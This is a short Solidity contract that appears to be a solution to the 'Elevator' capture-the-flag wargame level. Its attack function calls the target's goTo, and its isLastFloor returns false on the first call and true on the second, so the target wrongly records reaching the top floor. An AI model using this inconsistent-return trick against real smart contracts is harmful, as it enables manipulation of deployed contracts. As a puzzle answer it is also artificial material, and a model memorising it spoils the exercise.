// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256) external;
}

contract Building {
    uint count;

    function attack(address elevator) external {
        Elevator ev = Elevator(elevator);
        ev.goTo(1);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        return count++ == floor;
    }
}
